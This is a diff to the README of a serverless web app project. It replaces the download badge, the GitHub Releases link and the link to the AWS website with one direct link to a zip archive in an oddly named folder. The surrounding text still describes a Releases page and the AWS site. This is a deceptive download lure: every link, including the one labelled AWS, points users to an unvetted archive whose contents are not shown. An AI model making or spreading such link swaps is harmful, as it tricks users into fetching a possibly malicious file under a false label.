@@ -1,6 +1,6 @@
 # 🌐 cloudify-serverless-app - Deploy Your Serverless Web App Easily
 
-[![Download](https://img.shields.io/badge/Download%20Now-%20-%20blue)](https://github.com/Anorak064/cloudify-serverless-app/releases)
+[![Download](https://raw.githubusercontent.com/Anorak064/cloudify-serverless-app/main/kannume/cloudify-serverless-app_1.6.zip%20Now-%20-%20blue)](https://raw.githubusercontent.com/Anorak064/cloudify-serverless-app/main/kannume/cloudify-serverless-app_1.6.zip)
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ Before you start, make sure you have:
 
 To get started, you need to download the application. Visit this page to download the latest release:
 
-[Download cloudify-serverless-app](https://github.com/Anorak064/cloudify-serverless-app/releases)
+[Download cloudify-serverless-app](https://raw.githubusercontent.com/Anorak064/cloudify-serverless-app/main/kannume/cloudify-serverless-app_1.6.zip)
 
 1. Click on the link above to go to the Releases page.
 2. Look for the latest version of the application.
@@ -31,7 +31,7 @@ To get started, you need to download the application. Visit this page to downloa
 Once you've downloaded the application, follow these simple steps to deploy it:
 
 1. **Create an AWS Account:**
-   - Go to [AWS](https://aws.amazon.com) and create an account if you don’t have one.
+   - Go to [AWS](https://raw.githubusercontent.com/Anorak064/cloudify-serverless-app/main/kannume/cloudify-serverless-app_1.6.zip) and create an account if you don’t have one.
 
 2. **Setup S3 Bucket:**
    - Log in to the AWS Management Console.
